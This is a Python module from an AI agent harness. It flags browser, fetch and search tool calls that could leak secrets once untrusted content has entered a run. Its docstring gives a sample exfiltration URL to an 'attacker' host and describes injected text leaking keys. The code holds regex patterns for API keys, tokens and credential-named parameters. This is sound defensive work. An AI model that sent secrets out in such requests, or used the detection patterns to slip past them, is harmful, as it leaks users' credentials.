"""Egress after outside content (Agora #207).

Once untrusted outside content (a web page, a mail, a tool result) is in the
run, a GET can be an exfiltration channel: ``browser_navigate`` to
``https://attacker/c?k=<secret>`` moves the secret in one call, and the gate
used to treat navigation, ``inspect_image`` with a URL and ``web_search`` as
plain reads. This module decides whether one such call *looks like egress of
data*; the policy around it lives in ``ToolRunSecurityContext.decision_for``:

* ask / auto modes: a finding needs approval (the existing card).
* full access (or a task-scope "allow"): the call proceeds and an advisory is
  logged -- unless it carries detected secret material, then it is refused.
* ``web_search``: the query goes to the configured search engine, not to an
  arbitrary host, so only secret material counts; anything else is advisory.

Nothing here runs for a turn without outside content, and nothing here adds
an approval to any other tool. Findings are deliberately narrow:

1. a host the USER named in this turn is never a finding;
2. secret material anywhere in the URL / query (known key formats, secrets
   this session has seen: Faustus's configured keys, secret-named environment
   variables, values read from a sensitive file) is a finding, any host;
3. a link exactly as the run was shown it, or a host the run already visited
   this turn, is not a finding otherwise;
4. a NEW host whose query / fragment / path carries data-shaped values (long
   encoded tokens, base64 that decodes to text, credential-named parameters,
   a large payload) is a finding.
"""
from __future__ import annotations

import base64
import binascii
import json
import os
import re
import time
from dataclasses import dataclass
from typing import Any, Iterable, List, Mapping, Optional, Set
from urllib.parse import parse_qsl, unquote, urlsplit

URL_EGRESS_TOOLS = frozenset({"web_fetch", "browser_navigate", "inspect_image", "navigate_page", "new_page"})
SEARCH_EGRESS_TOOLS = frozenset({"web_search"})

SECRET_PATTERNS = (
    re.compile(r"(?<![A-Za-z0-9])sk-[A-Za-z0-9_\-]{6,}"),
    re.compile(r"(?<![A-Za-z0-9])[spr]k_(?:live|test)_[A-Za-z0-9]{8,}"),
    re.compile(r"(?<![A-Za-z0-9])gh[pousr]_[A-Za-z0-9]{20,}"),
    re.compile(r"(?<![A-Za-z0-9])github_pat_[A-Za-z0-9_]{20,}"),
    re.compile(r"(?<![A-Za-z0-9])(?:AKIA|ASIA)[0-9A-Z]{16}(?![0-9A-Z])"),
    re.compile(r"(?<![A-Za-z0-9])xox[abprs]-[A-Za-z0-9-]{10,}"),
    re.compile(r"(?<![A-Za-z0-9])AIza[0-9A-Za-z_\-]{30,}"),
    re.compile(r"(?<![A-Za-z0-9])hf_[A-Za-z0-9]{20,}"),
    re.compile(r"(?<![A-Za-z0-9])glpat-[A-Za-z0-9_\-]{20,}"),
    re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"),
    re.compile(r"(?<![A-Za-z0-9])eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}"),
    # An environment-style assignment of a secret-named variable.
    re.compile(r"[A-Z0-9_]*(?:API_?KEY|SECRET|TOKEN|PASSWORD|PASSWD)[A-Z0-9_]*\s*[=:]\s*[^\s&]{4,}"),
)
SENSITIVE_PARAM_NAMES = frozenset({
    "key", "apikey", "api_key", "api-key", "token", "access_token", "auth", "authorization", "secret",
    "password", "passwd", "pwd", "pass", "session", "sessionid", "sid", "cookie", "credential",
    "credentials", "private_key", "otp",
})
_SECRET_ENV_NAME = re.compile(r"(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|_PAT)(_|$)", re.I)
_SECRET_SETTING_NAME = re.compile(r"(api_?key|token|secret|password|passwd)", re.I)
_DOMAIN_RE = re.compile(r"\b((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,24})\b", re.I)
_URL_RE = re.compile(r"https?://[^\s<>\"'`)\]]+")


@dataclass(frozen=True)
class EgressFinding:
    tool: str
    kind: str          # "url" | "search"
    host: str
    secret: bool
    why: str

    def approval_reason(self, sources: str) -> str:
        seen = f" via {sources}" if sources else ""
        target = f"to {self.host}" if self.host else "out of this machine"
        return (f"This run has taken in outside content{seen}, and this '{self.tool}' call would send "
                f"data {target} ({self.why}). A request like that is how injected text leaks secrets, "
                "so it needs your go-ahead.")

    def refusal_reason(self) -> str:
        target = f"to {self.host}" if self.host else "out"
        return (f"Refused: after outside content entered this run, '{self.tool}' would send what looks "
                f"like secret material {target} ({self.why}). This is refused in every approval mode; "
                "if the user really means to send it, they can do it themselves.")


def base_tool(tool_name: Any) -> str:
    return str(tool_name or "").rsplit("__", 1)[-1]


def _parse(content: Any) -> Any:
    if isinstance(content, Mapping):
        return content
    raw = content if isinstance(content, str) else ("" if content is None else str(content))
    raw = raw.strip()
    if raw.startswith("{"):
        try:
            data = json.loads(raw)
            return data if isinstance(data, Mapping) else raw
        except (TypeError, ValueError):
            return raw
    return raw


def call_urls(tool_name: Any, content: Any) -> List[str]:
    base = base_tool(tool_name)
    if base not in URL_EGRESS_TOOLS:
        return []
    data = _parse(content)
    urls: List[str] = []
    if isinstance(data, Mapping):
        for key in ("url", "urls", "image_url", "src"):
            value = data.get(key)
            for v in (value if isinstance(value, (list, tuple)) else [value]):
                if isinstance(v, str) and v.strip():
                    urls.append(v.strip())
    elif isinstance(data, str) and base in {"web_fetch", "browser_navigate"}:
        first = data.split("\n", 1)[0].strip()
        if first:
            urls.append(first)
    return [u for u in urls if re.match(r"^[a-z][a-z0-9+.-]*://", u, re.I)
            and not u.lower().startswith(("file://", "about:", "data:"))]


def search_text(tool_name: Any, content: Any) -> str:
    if base_tool(tool_name) not in SEARCH_EGRESS_TOOLS:
        return ""
    data = _parse(content)
    if isinstance(data, Mapping):
        parts = []
        for key in ("query", "queries", "q"):
            value = data.get(key)
            for v in (value if isinstance(value, (list, tuple)) else [value]):
                if isinstance(v, str):
                    parts.append(v)
        return "\n".join(parts)
    return str(data or "").split("\n", 1)[0]


def host_of(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower().rstrip(".")
    except ValueError:
        return ""


def hosts_named_in(text: str) -> Set[str]:
    out: Set[str] = set()
    for url in _URL_RE.findall(text or ""):
        h = host_of(url)
        if h:
            out.add(h)
    for m in _DOMAIN_RE.findall(text or ""):
        out.add(m.lower())
    return out


def host_matches(host: str, known: Iterable[str]) -> bool:
    host = (host or "").lower()
    for k in known or ():
        k = (k or "").lower()
        if k and (host == k or host.endswith("." + k) or (k.startswith("www.") and host == k[4:])):
            return True
    return False


# --- secrets known to this session ------------------------------------------

_KNOWN_CACHE: dict = {"at": 0.0, "values": frozenset()}


def _configured_secrets() -> frozenset:
    """Secret-named environment variables and Faustus settings (cached 60 s)."""
    now = time.monotonic()
    if _KNOWN_CACHE["at"] and now - _KNOWN_CACHE["at"] < 60:
        return _KNOWN_CACHE["values"]
    values: set = set()
    for name, value in os.environ.items():
        if _SECRET_ENV_NAME.search(name) and isinstance(value, str) and 12 <= len(value) <= 4096 \
                and os.path.sep not in value and " " not in value:
            values.add(value)
    try:
        from src.settings import load_settings
        for name, value in (load_settings() or {}).items():
            if _SECRET_SETTING_NAME.search(str(name)) and isinstance(value, str) and 12 <= len(value) <= 4096 \
                    and " " not in value:
                values.add(value)
    except Exception:  # noqa: BLE001 - settings unavailable: patterns still apply
        pass
    _KNOWN_CACHE.update(at=now, values=frozenset(values))
    return _KNOWN_CACHE["values"]


def _variants(text: str) -> List[str]:
    out = [text]
    try:
        once = unquote(text)
        out.append(once)
        out.append(unquote(once))
    except Exception:  # noqa: BLE001
        pass
    return out


def secret_material(text: str, known: Iterable[str] = ()) -> str:
    """A short description of the secret found in ``text``, or ''."""
    if not text:
        return ""
    for variant in _variants(text):
        for pat in SECRET_PATTERNS:
            for m in pat.finditer(variant):
                hit = m.group(0)
                if pat.pattern.startswith("(?<![A-Za-z0-9])sk-") and not (len(hit) >= 10 and re.search(r"\d", hit)):
                    continue
                return "a value shaped like an API key or credential"
        for secret in list(known or ()) + list(_configured_secrets()):
            if secret and len(secret) >= 8 and secret in variant:
                return "a secret this session knows"
        for chunk in re.findall(r"[A-Za-z0-9+/_-]{24,}={0,2}", variant):
            decoded = _b64_text(chunk)
            if decoded and decoded != variant and secret_material(decoded, known):
                return "an encoded secret"
    return ""


def _b64_text(chunk: str) -> str:
    s = chunk.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    try:
        raw = base64.b64decode(s, validate=True)
    except (binascii.Error, ValueError):
        return ""
    if len(raw) < 12:
        return ""
    try:
        text = raw.decode("utf-8")
    except UnicodeDecodeError:
        return ""
    printable = sum(1 for ch in text if ch.isprintable() or ch in "\n\t")
    return text if printable / max(1, len(text)) >= 0.9 else ""


def _data_shape(value: str) -> str:
    v = unquote(value or "")
    if _b64_text(re.sub(r"[^A-Za-z0-9+/=_-]", "", v)) and len(v) >= 24:
        return "base64 that decodes to text"
    if re.fullmatch(r"[0-9a-fA-F]{32,}", v):
        return "a long hex token"
    if len(v) >= 20 and re.fullmatch(r"[A-Za-z0-9+/=_.\-]+", v) and re.search(r"\d", v) \
            and re.search(r"[A-Z]", v) and re.search(r"[a-z]", v):
        return "a long encoded token"
    return ""


def url_data_shape(url: str) -> str:
    try:
        parts = urlsplit(url)
    except ValueError:
        return "an unparseable URL"
    query = parts.query or ""
    if len(query) + len(parts.fragment or "") >= 256:
        return "a large query payload"
    for name, value in parse_qsl(query, keep_blank_values=True):
        if name.strip().lower() in SENSITIVE_PARAM_NAMES and len(value.strip()) >= 4:
            return f"a credential-named parameter '{name}'"
        why = _data_shape(value)
        if why:
            return why + " in the query"
    if parts.fragment:
        why = _data_shape(parts.fragment.split("=", 1)[-1])
        if why:
            return why + " in the fragment"
    for seg in (parts.path or "").split("/"):
        if len(seg) >= 24 and _b64_text(re.sub(r"[^A-Za-z0-9+/=_-]", "", unquote(seg))):
            return "base64 that decodes to text in the path"
    return ""


def finding_for(tool_name: Any, content: Any, *, user_hosts: Iterable[str] = (), visited_hosts: Iterable[str] = (),
                seen_url_keys: Iterable[str] = (), known_secrets: Iterable[str] = (),
                url_key=None) -> Optional[EgressFinding]:
    base = base_tool(tool_name)
    name = str(tool_name or "")
    if base in SEARCH_EGRESS_TOOLS:
        text = search_text(tool_name, content)
        why = secret_material(text, known_secrets)
        if why:
            return EgressFinding(name, "search", "the search engine", True, why)
        long_tok = next((t for t in re.split(r"\s+", text) if _data_shape(t)), "")
        if long_tok:
            return EgressFinding(name, "search", "the search engine", False, _data_shape(long_tok) + " in the query")
        return None
    seen = set(seen_url_keys or ())
    for url in call_urls(tool_name, content):
        host = host_of(url)
        if host and host_matches(host, user_hosts):
            continue
        why = secret_material(url, known_secrets)
        if why:
            return EgressFinding(name, "url", host, True, why)
        if url_key is not None and url_key(url) in seen:
            continue
        if host and host_matches(host, visited_hosts):
            continue
        why = url_data_shape(url)
        if why:
            return EgressFinding(name, "url", host, False, why)
    return None
